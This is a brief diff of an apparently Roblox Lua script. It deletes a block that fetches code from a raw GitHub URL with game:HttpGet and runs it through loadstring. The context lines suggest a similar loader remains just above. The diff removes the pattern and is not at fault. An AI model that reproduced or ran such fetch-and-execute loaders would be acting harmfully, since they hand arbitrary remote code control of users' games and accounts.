@@ -1096,11 +1096,3 @@ end)
 if not success then
     warn("Failed to load external script:", err)
 end
-
-humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
-local success, err = pcall(function()
-  loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/I'm%20you'))()  
-end)
-if not success then
-    warn("Failed to load external script:", err)
-end
